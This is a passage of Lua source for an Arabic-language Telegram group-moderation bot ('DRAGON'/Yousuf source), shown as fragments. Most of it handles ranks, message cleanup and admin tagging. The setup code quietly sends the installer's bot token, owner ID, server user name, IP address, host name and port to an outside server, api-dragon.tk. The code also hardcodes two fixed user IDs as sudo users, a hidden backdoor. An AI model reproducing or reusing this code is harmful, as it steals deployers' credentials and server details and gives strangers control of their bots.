...
if res ~= 200 then
print('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝚈𝚘𝚞𝚜𝚞𝚏 ┉  ┉ ┉ ┉ ┉≫ٴ\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \naٴ≪┉ ┉ ┉ ┉ ┉ 𝚈𝚘𝚞𝚜𝚞𝚏 ┉  ┉ ┉ ┉ ┉≫ٴ\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35mٴ≪┉ ┉ ┉ ┉ ┉ 𝚈𝚘𝚞𝚜𝚞𝚏 ┉  ┉ ┉ ┉ ┉≫ٴ ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
data,res = https.request("https://api-dragon.tk/api-php_77/Dragon.php?bn=DRAGON&id="..SUDOID)
if res == 200 then
...
local t = json:decode(https.request('https://api-dragon.tk/api-php_77/Dragon.php?n=DRAGON&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
else
io.write('\27[0;31mٴ≪┉ ┉ ┉ ┉ ┉ 𝚈𝚘𝚞𝚜𝚞𝚏 ┉  ┉ ┉ ┉ ┉≫ٴ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
end  
os.execute('lua DRAGON.lua')
end 
end
...
sudo_users = {SUDO,119541395,1779150039}   
...
local hash = database:sismember(bot_id.."php_77:MN:TF"..msg.chat_id_,msg.sender_user_id_)    
if hash or SudoBot(msg) or DevSoFi(msg) or Sudo(msg) or BasicConstructor(msg) or CoSu(msg) or Bot(msg)  then       
return true    
else    
return false    
...
var = true  
elseif database:sismember(bot_id..'php_77:MN:TF'..chat_id, user_id) then
var = true 
...
local UserName = (data.username_ or "php_d")
...
-------------
if text == "🐉 حصريات و تحديثات يوسف  🐉" and DevSoFi(msg) then  
local updatech =[[
...
{{text = '📂┇𝙳𝚁𝙰𝙶𝙾𝙽 𝚄𝙿𝙳𝙰𝚃𝙴𝚂.', url="t.me/php14 "}},
}
...
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'php_d')..')'
status  = '\n ⌯︙ تم ترقيته مطور'
...
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
status  = '\n ⌯︙ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'php_d')..') \n ⌯︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/php_d)}\n ⌯︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⌯︙ عذرا » {["..data.first_name_.."](T.ME/php_d)}\n ⌯︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
bnnaGet(msg.sender_user_id_, php_77_name)
end
...
⌯ ⦑ SOURCE Yousuf ⦒ 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⌯︙ [Source Yousuf](t.me/php_d)
⌯︙ [Source Update ](t.me/php14 )     
⌯︙ [Source developer](t.me/php_77)     
⌯︙ [Dragon programmer](t.me/php14 ) 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ⌯︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'php_d')..') \n ⌯︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ⌯︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'php_d')..') \n ⌯︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if not database:get(bot_id..'Cick:all'..msg.chat_id_) then
if database:get(bot_id.."php_77:all:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
return 
send(msg.chat_id_, msg.id_,"انتظر دقيقه من فضلك")
end
database:setex(bot_id..'php_77:all:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
...
database:del(bot_id..'php_77:MN:TF'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⌯︙ تم مسح المنظفين')
end
if text == ("المنظفين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'php_77:MN:TF'..msg.chat_id_)
t = "\n ⌯︙ قائمة المنظفين \n≪━━━━━━𝓓𝓡𝓖━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'php_77:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
send(msg.chat_id_, msg.id_, usertext..status)
...
database:sadd(bot_id..'php_77:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'php_d')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
texts = usertext..status
else
...
database:sadd(bot_id..'php_77:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
status  = '\n ⌯︙ تم ترقيته منظف'
...
function start_function(extra, result, success)
database:srem(bot_id..'php_77:MN:TF'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
...
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'php_77:MN:TF'..msg.chat_id_, result.id_)
usertext = '\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(username or 'php_d')..')'
status  = '\n ⌯︙ تم تنزيله من المنظفين'
texts = usertext..status
else
...
database:srem(bot_id..'php_77:MN:TF'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
status  = '\n ⌯︙ تم تنزيله من المنظفين'
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ⌯︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
status  = '\n ⌯︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ⌯︙ العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⌯︙ العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ⌯︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'php_d')..')'..'\n ⌯︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if not database:get(bot_id..'php_77:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then           
...
database:setex(bot_id..'php_77:Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end
end
...
database:sadd(bot_id.."php_77:allM"..msg.chat_id_, msg.id_)
end
if text == ("امسح") and cleaner(msg) then  
local list = database:smembers(bot_id.."php_77:allM"..msg.chat_id_)
for k,v in pairs(list) do
local Message = v
if Message then
t = "⌯︙ تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."php_77:allM"..msg.chat_id_)
end
end
if #list == 0 then
...
local num = database:smembers(bot_id.."php_77:allM"..msg.chat_id_)
...
if database:sismember(bot_id..'php_77:MN:TF'..msg.chat_id_, result.id_) then
mn = 'منظف ،' else mn = '' end
...
own = 'مدير ،' else own = '' end
if database:sismember(bot_id..'php_77:MN:TF'..msg.chat_id_, result.sender_user_id_) then
mn = 'منظف ،' else mn = '' end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽.',url="t.me/php_d"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."php_d:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."php_d:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."php_d:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."php_d:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"⌯︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."php_d:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."php_d:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'php_d')..')'
local iduser = result.sender_user_id_
...
send(msg.chat_id_, msg.id_, t..'ٴ≪┉ ┉ ┉ ┉ ┉ 𝚈𝚘𝚞𝚜𝚞𝚏 ┉  ┉ ┉ ┉ ┉≫ٴٴ\n⌯︙ ➫ .[🖨┇𝚂𝙾𝚄𝚁𝙲𝙴𝚂 𝙳𝚁𝙰𝙶𝙾𝙽. ](t.me/php_d)➤ ')
end
...
------------------------------------------------------------------------
local Yousufbot = database:get(bot_id.."DRAGON1:Add:Filter:Rp2"..text..result.chat_id_)   
if Yousufbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⌯︙ العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⌯︙ ["..Yousufbot.."] \n") 
